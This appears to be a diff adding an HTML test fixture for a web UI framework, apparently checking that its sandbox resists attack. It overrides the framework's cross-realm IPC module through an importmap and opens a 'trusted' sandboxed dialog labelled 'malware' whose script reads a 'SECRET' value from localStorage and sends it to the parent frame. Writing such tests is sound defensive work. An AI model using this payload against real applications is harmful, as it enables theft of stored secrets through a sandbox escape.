@@ -1,0 +1,25 @@
+<script type="importmap">
+  {
+    "imports": {
+      "/42/core/ipc/xrealm.js": "./xrealm-attack.js"
+    }
+  }
+</script>
+
+<script type="module">
+  import dialog from "../../../42/ui/components/dialog.js"
+  dialog(
+    {
+      label: "malware",
+      content: {
+        tag: "ui-sandbox",
+        permissions: "trusted",
+        script: `
+import ipc from "../../../42/core/ipc.js"
+ipc.to.parent.emit('xss', localStorage.getItem('SECRET'))
+`,
+      },
+    },
+    { trusted: true }
+  )
+</script>
